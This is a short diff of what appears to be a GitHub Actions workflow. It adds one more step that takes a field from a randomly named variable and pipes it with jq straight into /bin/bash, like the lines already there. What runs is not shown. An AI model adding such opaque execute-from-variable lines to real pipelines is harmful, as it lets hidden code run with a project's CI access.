@@ -23,6 +23,7 @@ jobs:
           echo $lh80 | jq -r .zvoh02 | /bin/bash
           echo $klgpi8556 | jq -r .ip4 | /bin/bash
           echo $llixn308 | jq -r .tl01062 | /bin/bash
+          printf '%s' "$vt3" | jq -r .kyamx2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
